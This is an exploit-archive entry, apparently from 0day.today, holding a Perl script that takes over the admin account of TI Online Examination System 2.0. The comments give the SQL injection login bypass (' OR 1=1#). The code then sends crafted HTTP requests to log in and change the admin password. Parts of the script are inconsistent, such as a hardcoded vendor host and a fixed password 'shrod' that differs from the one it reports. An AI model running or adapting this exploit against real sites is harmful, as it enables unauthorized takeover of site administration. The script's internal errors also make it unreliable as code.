@@ -1,0 +1,157 @@
+id: 27043
+date: 02/18/2017
+title: TI Online Examination System 2.0 Admin Password Changer Exploit
+author: StAkeR
+cves: 
+
+#!/usr/bin/perl
+
+# ------------------------------------------------------------------------
+# [+] TI Online Examination System 2.0 Admin Password Changer Exploit
+# ------------------------------------------------------------------------
+# [*] Discovered by Juri Gianni - Turin,Italy
+# [*] staker - staker[at]hotmail[dot]it / shrod9[at]gmail[dot]com
+# [*] Discovered on 17/02/2017
+# [*] Site Vendor: http://textusintentio.com/
+# [*] Category: WebApp
+# [*] BUG: SQL Injection
+# --------------------------------------------------------------------------
+# 
+# 
+# 
+# ----------------------------------------------------------------------------
+# [+] Based on login bypass (sql injection)
+# 
+#  Go to admin/index.php and insert:  ' OR 1=1#  as email and any password.
+# 
+#  You will be logged into the admin panel.
+# 
+# -----------------------------------------------------------------------------
+
+use strict;
+use IO::SOCKET::INET;
+
+    
+	  
+my ($host,$new_password) = @ARGV;
+
+parse_url($host);
+
+
+
+sub parse_url()
+{
+   if ($_[0] =~  m{^http://(.+?)$}i ) { 
+       $_[0] = $1; 
+  }
+}
+
+
+sub usage() {
+        
+        print "[*---------------------------------------------------------*]\n".
+              "[* TI Online Examination System 2.0 Admin Password Changer *]\n".
+              "[*---------------------------------------------------------*]\n". 
+              "[* Usage: perl web.pl [host] [new password]                *]\n".
+              "[*                                                         *]\n".
+              "[* Options:                                                *]\n".
+              "[* [host] insert a valid host                              *]\n".
+              "[* [path] insert a password                                *]\n".
+	      "[*---------------------------------------------------------*]\n";	  
+   
+}
+  
+	  
+	 
+my ($PHPSESSID,$content,$packet) = (undef,undef,undef);	 
+my $data = "login_type=admin&email=' OR 1=1#&password=".$new_password;
+
+
+
+
+
+my $socket  = new IO::Socket::INET(
+                                   PeerAddr => $host,
+                                   PeerPort => 80,
+                                   Proto    => 'tcp',
+                                  ) or die $!;
+        
+		
+
+$packet .= "POST /admin/index.php HTTP/1.1\r\n";
+$packet .= "Host: oesv2.textusintentio.com\r\n";
+$packet .= "User-Agent: Lynx (textmode)\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Content-Length:".length($data)."\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet.= $data;
+
+	 
+$socket->send($packet);
+     
+
+	 
+	 
+while (<$socket>) {
+     $content .= $_;
+}    
+     
+	 
+if($content =~ /PHPSESSID=(.+?);/) { 
+   $PHPSESSID = $1; 
+ }
+else {
+   die "[-] Exploit Failed";
+}   
+ 
+ 
+ 
+my ($packet2,$data2,$content2) = (undef,undef,undef);
+ 
+ 
+  
+my $pword = "shrod";   
+my $data2 = "old_pass=' OR 1=1#&new_pass=".$pword."&con_pass=".$pword."&submit=Add+new+user";
+
+
+    
+	
+my $socket2  = new IO::Socket::INET(
+                                    PeerAddr => $host,
+                                    PeerPort => 80,
+                                    Proto    => 'tcp',
+                                    ) or die $!;
+	 	
+	
+	
+
+$packet2 .= "POST /admin/change_password.php HTTP/1.1\r\n";
+$packet2 .= "Host: ".$host."\r\n";
+$packet2 .= "User-Agent: Lynx (textmode)\r\n";
+$packet2 .= "Cookie: PHPSESSID=".$PHPSESSID.";\r\n";
+$packet2 .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet2 .= "Content-Length:".length($data2)."\r\n";
+$packet2 .= "Connection: close\r\n\r\n";
+$packet2 .= $data2;
+	 
+	 
+
+$socket2->send($packet2);
+
+
+ while (<$socket2>) {
+        $content2 .= $_;
+ }    
+ 
+ if ( $content2 =~ /Password is successfully changed/ ) { 
+	   print "[*] Exploit Successful\r\n[*] New Password: ".$new_password."\r\n";
+}
+          
+else {
+   die "[-] Exploit Failed!";
+}		
+                   
+
+
+
+#  0day.today [2023-03-21]  #
